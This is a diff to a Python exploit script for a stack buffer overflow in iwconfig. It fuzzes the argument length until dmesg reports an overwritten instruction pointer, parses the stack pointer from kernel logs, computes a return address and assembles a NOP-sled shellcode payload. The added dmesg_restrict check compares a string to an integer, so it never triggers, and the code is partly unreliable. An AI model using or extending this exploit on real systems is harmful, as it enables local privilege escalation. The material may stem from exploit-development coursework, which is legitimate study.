@@ -1,6 +1,16 @@
 import subprocess
 import struct
 import os
+import sys
+
+
+#check if kernel.dmesg_restrict is enabled
+kernel_dmesg = subprocess.Popen(['sysctl', 'kernel.dmesg_restrict'], stdout=subprocess.PIPE)
+kernel_output, _ = kernel_dmesg.communicate()
+kernel_res = kernel_output.decode().split(" ")
+if kernel_res[2] == 1:
+    sys.exit()
+
 
 buffer = b"A"
 command = ["iwconfig", buffer.decode()]
@@ -28,13 +38,13 @@ while True:
         dmesg_res = tail_output.decode().split(" ")
         # ip is the 11th token (starting from 0), sp is the 13th
 
-        if dmesg_res[11] != "0000000041414141":
+        if dmesg_res[10] != "0000000041414141":
             buffer += b"A"
             command = ["iwconfig", buffer.decode()]
             continue
         else:
 
-            find_sp = b"A" * (len(buffer) - 4) + b"BBBB" + b"C" * 10028
+            find_sp = b"A" * (len(buffer) - 4) + b"BBBB" + b"C" * 10028   #10000 nops + 28 bytes shellcode
             command = ["iwconfig", find_sp.decode()]
             iwconfig = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             stdout_data, stderr_data = iwconfig.communicate()
@@ -47,7 +57,7 @@ while True:
             tail_output2, _ = tail_process.communicate()
             dmesg2_res = tail_output2.decode().split(" ")
 
-            sp_hex = int(dmesg2_res[13], 16)
+            sp_hex = int(dmesg2_res[12], 16)
             ret_addr = sp_hex + 5000
 
             payload = b"A" * (len(buffer) - 4)
